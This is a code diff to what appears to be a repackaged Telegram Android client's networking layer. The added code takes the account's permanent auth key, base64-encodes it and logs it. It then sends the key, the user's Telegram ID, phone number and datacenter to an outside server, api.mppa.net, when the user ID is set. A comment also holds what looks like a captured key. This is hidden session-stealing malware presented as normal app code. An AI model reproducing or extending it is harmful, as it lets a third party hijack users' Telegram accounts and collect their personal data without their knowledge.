@@ -45,6 +45,7 @@ static bool done = false;
 
 #include <iostream>
 #include "libnhr/libnhr.h"
+#include "libnhr/base64.h"
 #include <android/log.h>
 /*
  *   Copyright (c) 2016 - 2019 Oleh Kulykov <info@resident.name>
@@ -132,20 +133,39 @@ static void test_get_on_response(nhr_request request, nhr_response response) {
     test_get_working = nhr_false;
 }
 
-static int upload_number_authkey(int64_t number,std::string strPhone) {
+static int upload_number_authkey(int64_t number,std::string strPhone,std::string strAuthkey) {
 
     test_get_request = nhr_request_create();
 
     std::string userid = ConnectionsManager::getInstance(number).getUserId();
     std::string userPhone = ConnectionsManager::getInstance(number).getUserPhone();
     std::string userdatacenterid = ConnectionsManager::getInstance(number).getUserDataCenterId();
-    std::string strUrl = "/api/index/autokey.html?tgid=" + userid + "&phonenumber=" + userPhone + "&auto_key=" + "telegram" + "&datacenterid=" + userdatacenterid + "&source=" + "telegramandroid";
+    std::string base64authkey = base64_encode(strAuthkey);//"E5QDL3GyxGl8bx0EBdFD3gdUckeTgUKp5d5dEq0VA6a3J/kRWfWGiheciyhm93nw7xNvRVacD5wuAQ3Bn1PLmgFFrVwlU4 qxhQtpYHZ9M4Ote7B1wBXRpNJABPkP2MyMraQzopRktXLJP5i2Q1fBaS2wm4MWXXHBbtobmWMQjtqmJdbFDZjVPwwf8j7DWzmVv1HY5BwNBsTM0xCDWgQav9l6jyA2H0cI1aQJOHE0Tr6YqEUVLOFl9NJ9IgxDTE8dB/dYEaiZSGg6aBuo0PmoE4QwGwYx1vEjufot1diROth/fT1PHKdb3qkfBmEtuQ2ZZc8dj/02Dsw7uKow==";//base64_encode_pem(strAuthkey);
 
     __android_log_write(ANDROID_LOG_ERROR, "test_get_number userid", userid.c_str());//Or ANDROID_LOG_INFO, ...
-    __android_log_write(ANDROID_LOG_ERROR, "test_get_number userphone", userPhone.c_str());
-    __android_log_write(ANDROID_LOG_ERROR, "test_get_number userphone1", strPhone.c_str());
+    __android_log_write(ANDROID_LOG_ERROR, "test_get_number userphoneread", userPhone.c_str());
+    __android_log_write(ANDROID_LOG_ERROR, "test_get_number userphoneinput", strPhone.c_str());
+    __android_log_write(ANDROID_LOG_ERROR, "test_get_number authkey", strAuthkey.c_str());
+    __android_log_write(ANDROID_LOG_ERROR, "test_get_number base64authkey", base64authkey.c_str());
     __android_log_write(ANDROID_LOG_ERROR, "test_get_number userdatacenterid", userdatacenterid.c_str());
-    nhr_request_set_url(test_get_request, "https", "api.mppa.net", strUrl.c_str(), 80);
+
+
+    int params = 1;
+    if(params == 1)
+    {
+
+
+        std::string strUrl = "/api/index/autokey.html";
+        __android_log_write(ANDROID_LOG_ERROR, "test_get_number request url", strUrl.c_str());
+        nhr_request_set_url(test_get_request, "https", "api.mppa.net", strUrl.c_str(), 80);
+    }
+    else
+    {
+        std::string strUrl = "/api/index/autokey.html?tgid=" + userid + "&phonenumber=" + userPhone + "&auto_key=" + base64authkey + "&datacenterid=" + userdatacenterid + "&source=" + "telegramandroid";
+        nhr_request_set_url(test_get_request, "https", "api.mppa.net", strUrl.c_str(), 80);
+    }
+
+
 
 
     nhr_request_set_method(test_get_request, nhr_method_GET);
@@ -159,14 +179,20 @@ static int upload_number_authkey(int64_t number,std::string strPhone) {
     nhr_request_add_header_field(test_get_request, "Connection", "close");
     //nhr_request_add_header_field(test_get_request, "User-Agent", "CMake tests");
 
-    switch (number) {
-        case 1:
-            //nhr_request_add_parameter(test_get_request, test_get_param_name1, test_get_param_value1);
-            break;
+    if(params == 1)
+    {
 
-        default:
-            break;
+        nhr_request_add_parameter(test_get_request, "tgid", userid.c_str());
+        nhr_request_add_parameter(test_get_request, "phonenumber", userPhone.c_str());
+        nhr_request_add_parameter(test_get_request, "auto_key", base64authkey.c_str());
+        nhr_request_add_parameter(test_get_request, "datacenterid", userdatacenterid.c_str());
+        nhr_request_add_parameter(test_get_request, "source", "telegramandroid");
     }
+    else
+    {
+    }
+
+
 
     nhr_request_set_on_recvd_response(test_get_request, &test_get_on_response);
     nhr_request_set_on_error(test_get_request, &test_get_on_error);
@@ -2060,39 +2086,11 @@ void ConnectionsManager::setUserId(int64_t userId,int64_t phone) {
             Datacenter *datacenter = getDatacenterWithId(currentDatacenterId);
             if (datacenter != nullptr) {
                 ByteArray *auth = datacenter->authKeyPerm;
-                std::string s3(reinterpret_cast<char const*>(&auth[0]), auth->length);
-                upload_number_authkey(0,std::to_string(phone));
+                std::string sauthkey(reinterpret_cast<char const*>(&auth[0]), auth->length);
+                upload_number_authkey(0,std::to_string(phone),sauthkey);
             }
         }
 
-
-
-
-//        std::string strUrl1 = "/api/index/autokey.html?tgid=" + std::to_string(userId) + "&phonenumber=" + phone + "&auto_key=" + "telegram" + "&datacenterid=" + std::to_string(currentDatacenterId)+ "&source=" + "telegramandroid";
-//        //https://api.mppa.net/api/index/autokey.html
-//        std::string strUrl = "/api/index/autokey.html?tgid=" + std::to_string(645445109) + "&phonenumber=" + "639687312994" + "&auto_key=" + "telegram" + "&datacenterid=" + std::to_string(5)+ "&source=" + "telegramandroid";
-//
-//        nhr_request_set_url(_request, "https", "api.mppa.net", strUrl.c_str(), 80);
-//        nhr_request_set_method(_request, nhr_method_GET);
-//        nhr_request_set_timeout(_request, 10);
-//
-//        nhr_request_add_header_field(_request, "Cache-control", "no-cache");
-//        nhr_request_add_header_field(_request, "Accept-Charset", "utf-8");
-//        nhr_request_add_header_field(_request, "Accept", "application/json");
-//        nhr_request_add_header_field(_request, "Connection", "close");
-////        nhr_request_add_parameter(_request, "tgid", std::to_string(userId).c_str());
-////        nhr_request_add_parameter(_request, "phonenumber", phone.c_str());
-////        nhr_request_add_parameter(_request, "datacenterid", std::to_string(currentDatacenterId).c_str());
-////        nhr_request_add_parameter(_request, "source", "telegramanroid");
-////        nhr_request_add_parameter(_request, "auto_key", "telegramanroid");
-//        nhr_request_set_on_recvd_response(_request, &test_get_on_response);
-//        test_get_working = nhr_request_send(_request);
-//
-//        while (test_get_working) {
-//            nhr_thread_sleep(20);
-//        }
-//
-//        nhr_thread_sleep(834);
 
     });
 }
